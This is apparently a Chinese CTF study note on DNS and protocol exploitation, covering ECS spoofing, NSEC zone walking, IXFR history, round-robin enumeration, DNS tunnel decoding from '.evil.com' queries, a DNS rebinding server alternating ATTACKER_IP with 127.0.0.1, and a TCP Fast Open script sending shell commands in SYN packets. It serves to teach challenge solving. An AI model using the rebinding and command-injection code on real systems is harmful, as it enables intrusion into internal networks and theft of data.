---

title: 协议异常与 DNS 利用
phase: misc
vuln_class: [misc, dns, ecs, dnssec, ixfr, rebinding, tunneling, tfo]
summary: DNS 题的判据是「记录本身在说什么」——记录按客户端 IP 变就是 ECS，NSEC 链能走就是整区枚举，IXFR diff 里有旧 SOA 就是历史记录，CNAME 指 UUID 就是图，SYN 带载荷才响应就是 TFO。
---

# 协议异常与 DNS 利用

通用抓包与流量分析见 [[forensics/网络取证/network.md|网络取证]]；DNSLog 外带回连（Web 侧利用）见 [[web/漏洞分类/DNS外带/DNSLog OOB 外带回连.md|DNSLog OOB 外带回连]]。

## 0. 判据速查

| 观察到的现象 | 结论 | 去哪节 |
|---|---|---|
| 同一名字从不同网络查回不同记录 | 服务端按客户端 IP 分流 | §1 |
| 响应里带 `NSEC` 记录 | 未做 NSEC3，可走链枚举整区 | §2 |
| 响应里只有 `NSEC3`（哈希名） | 走不了链，只能爆破 | §2 |
| `AXFR` 被拒 | 试 `IXFR=0` 拉历史 | §3 |
| 单次查询只回 1-2 个 A，但后端明显不止 | round-robin，需反复查 | §4 |
| CNAME 指向一串 UUID 子域 | 记录即图，BFS | §5 |
| 抓包里有大量长随机子域 | DNS 隧道外带 | §6 |
| 需要绕同源/内网 IP 白名单 | DNS rebinding | §7 |
| 端口扫描全关，但题目提示 RFC 7413 | TFO，载荷要塞进 SYN | §8 |

## 1. ECS 伪造：按客户端 IP 变记录

服务端配了 EDNS Client Subnet 时，会用**你声称的来源网段**而不是真实源 IP 去查地理/内网库，于是内网专属记录就出来了。

```bash
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**先验证服务端真的看 ECS**：同一名字跑两次，一次带 `+subnet` 一次不带。结果一样说明服务端没启 EDNS 或不分流，这条路直接放弃，别在网段上瞎试。

网段优先试 leet 与三大内网：`10.13.37.0/24`（1337）、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`。前缀长度也影响命中——`/24` 不中时试 `/16`、`/8`（粒度更粗更容易落进某个分桶）。

## 2. DNSSEC NSEC walking

NSEC 记录语义是「本名字之后的下一个名字」，所以沿链走就是整区枚举，不需要字典。

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    current, visited, records = base_domain, set(), []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        m = re.search(r'NSEC\s+(\S+)', out)
        if not m:
            break
        current = m.group(1).rstrip('.')
    return records
```

**判据是记录类型而不是有没有 DNSSEC**：只有 `NSEC3` 时名字被哈希过，链断了，walk 无效，只能爆破；有 `NSEC` 才能走。有些区两者并存（NSEC3 opt-out），先 `dig +dnssec ANY` 看回的是哪种。

## 3. IXFR 拉历史记录

`AXFR` 常被单独封，但 `IXFR` 未必。`IXFR=0` 表示「我什么版本都没有，把全部历史给我」。

```bash
dig @server -p 5054 flag.example.com IXFR=0
```

**读 diff 的方向别搞反**：输出按「旧 SOA → 被删除的记录 → 新 SOA → 新增的记录」成组出现。夹在两个 SOA 之间的记录是**已删除的**，新 SOA 之后的是新增的。要的 flag 碎片通常在已删除的 TXT 里。

**坑**：RFC 1995 允许服务端在 IXFR 不可用时回退成 AXFR 全量。看到输出里没有成对的 SOA，说明它其实给了你 AXFR，那就直接读全量，别找 diff。

## 4. Round-robin A 记录枚举

后端一组异构机器共享一个域名，单次查询只回其中一小部分。要拿全必须反复查。

```bash
for i in $(seq 1 100); do dig +short target.com A; done | sort -u > ips.txt

while read ip; do
    response=$(curl -s -m 3 -H "Host: target.com" "http://$ip/")
    echo "$response" | grep -q "flag" && { echo "Found on $ip"; echo "$response"; }
done < ips.txt
```

**两个必须做对的地方**：

- **查权威 NS，不查递归**。走本地 resolver 时 TTL 内的应答被缓存，100 次查回来的是同一条，等于只查了 1 次。用 `dig @<权威NS>` 直连，或确认 TTL 很短。
- **必须带 `Host` 头**。后端是虚拟主机，裸 IP 请求落到默认站，全是 404，会误判成「这些 IP 没内容」。

## 5. DNS maze：记录就是图

节点是 UUID 子域，边是方向子域的 CNAME，节点数据是 TXT。标准图搜索即可。

```python
import dns.resolver
from collections import deque

def get_neighbors(uuid, domain):
    n = {}
    for d in ('up', 'down', 'left', 'right'):
        try:
            n[d] = str(dns.resolver.resolve(f'{d}.{uuid}.{domain}', 'CNAME')[0]).split('.')[0]
        except Exception:
            pass
    return n

queue, visited = deque([(start_uuid, [start_uuid])]), {start_uuid}
while queue:
    cur, path = queue.popleft()
    txt = dns.resolver.resolve(f'{cur}.{domain}', 'TXT')
    if 'flag' in str(txt[0]):
        print(f"Found at {cur}: {txt[0]}")
        break
    for _, nxt in get_neighbors(cur, domain).items():
        if nxt not in visited:
            visited.add(nxt)
            queue.append((nxt, path + [nxt]))
```

**用 `dns.resolver` 而不是 subprocess `dig`**：往返时间主导总耗时，每节点 4 次查询乘上去，进程启动开销会拖成数量级差距。**`visited` 必须有**，这类图几乎都带环。

## 6. DNS 隧道与 C2（抓包侧）

```bash
# 外带：A 查询的长子域
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort -u

# 回连：TXT 查询
tshark -r capture.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name -e dns.txt
```

```python
import base64
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
print(base64.b32decode(''.join(chunks).upper() + '===='))
```

**子域取哪一段看编码粒度**：数据在第一段时取 `split('.')[0]`；如果第一段是序号（`0001`、`0002`），数据在第二段，取 `[1]`。base32 的长度补齐必须自己加（`'===='` 兜底），否则 `b32decode` 报错。

## 7. DNS rebinding

低 TTL + 奇偶交替解析：第一次给你攻击者 IP（下发恶意 JS），第二次给 `127.0.0.1`。浏览器认为同源，JS 直接打内网。

```python
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.count[qname] = self.count.get(qname, 0) + 1
        reply = request.reply()
        ip = "ATTACKER_IP" if self.count[qname] % 2 == 1 else "127.0.0.1"
        reply.add_answer(RR(qname, rdata=A(ip), ttl=1))
        return reply
```

现成服务：[rbndr.us](http://rbndr.us/)（把两个 IP 拼进域名即可）、[singularity](https://github.com/nccgroup/singularity)（全自动，带浏览器控制与 payload 注入）。

**TTL 必须压到 1 秒**，且浏览器有 DNS pinning 缓存——同一名字在会话内可能被复用，所以要用**不同的子域**触发重新解析，不能靠等。

## 8. TCP Fast Open：载荷塞进 SYN

RFC 7413 允许 SYN 携带最多约 1460 字节数据，服务端在三次握手完成前就交给应用层。如果那个 handler 直接把字节喂给命令解释器，不建连也能执行。

```python
import socket
MSG_FASTOPEN = 0x20000000

def tfo_send(host, port, payload: bytes, timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.sendto(payload, MSG_FASTOPEN, (host, port))
    try:
        return s.recv(65536)
    finally:
        s.close()

print(tfo_send('10.13.37.99', 3737, b'SyN cat ./secret/me/not/flag.txt'))
```

```python
# Scapy 版：不依赖内核 TFO cookie
# send(IP(dst=host)/TCP(dport=port, flags='S', seq=1)/b'SyN ls -la')
```

**为什么常规扫描看不出端口开**：`nmap -sS`、`nc -vz` 的 SYN 不带数据，TFO-only 服务只回一个空的 SYN-ACK 甚至静默。看到「端口全关但题目提示 knock / RFC 7413 / fast open」就该换这条路。

**前缀就是鉴权 token**：handler 往往校验前 3-4 字节（`SyN`），因为它是最容易被嗅探看到的部分，所以题面/抓包里出现过的怪前缀直接拿来用。

**坑**：服务端内核没开 TFO（`net.ipv4.tcp_fastopen` 服务端位未置）时，SYN 里的数据被丢弃，表现为「握手成功但收不到任何响应」——这不是 payload 写错，换 Scapy 手工构包也一样，说明服务端根本没这个特性。

## 9. 枚举速查

```bash
dig @ns.target.com target.com AXFR                      # 区传送
dig @ns.target.com target.com IXFR=0                    # 历史（AXFR 被封时）
dig @ns.target.com target.com ANY +dnssec               # 看 NSEC 还是 NSEC3
for i in $(seq 1 254); do dig +short -x 10.0.0.$i; done # 反查扫段
dig randomnonexistent.target.com                        # 有无泛解析（有则爆破全命中，需按内容过滤）
```

## 10. 纪律

- **先判「记录在说什么」再选手法**。DNS 题的难点从来不是发包，而是看出这条记录是分流的、是链的、还是图的。
- **区分「服务端不支持」和「参数没对」**。ECS 无效果先做对照实验；TFO 无响应先查服务端开关；IXFR 回全量是回退不是失败。
- **查权威别查递归**。凡是需要多次查询的（round-robin、maze、爆破），走缓存会让结果假性收敛。
- **`visited` 和超时是必需品**。图遍历和轮询不设上限，跑一小时才发现有环。
